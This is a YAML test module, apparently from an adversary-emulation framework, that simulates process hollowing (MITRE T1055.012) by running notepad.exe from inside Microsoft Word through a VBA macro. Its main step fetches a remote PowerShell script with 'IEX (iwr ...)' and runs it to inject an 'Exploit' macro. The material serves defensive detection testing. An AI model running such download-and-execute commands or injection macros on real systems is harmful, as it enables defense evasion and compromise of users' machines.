api_version: "2.0"
name: RunPE via VBA
description: |
    This module executes notepad.exe from within the WINWORD.EXE process
args:
    - name: ms_product
      type: string
      default: Word
uuid: 3ad4a037-1598-4136-837c-4027e4fa319b
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
        - 'TA0004: Privilege Escalation'
    techniques:
        - 'T1055: Process Injection'
    subtechniques:
        - 'T1055.012: Process Hollowing'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Microsoft #{ms_product} must be installed
      inline: |
        try {
          New-Object -COMObject "#{ms_product}.Application" | Out-Null
          $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
          Stop-Process -Name $process
          exit 0
        } catch { {Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
        } }
      executor: powershell
    - name: runpe-via-vba
      inline: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"{{.Args.ms_product}}\" -sub \"Exploit\"\n"
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
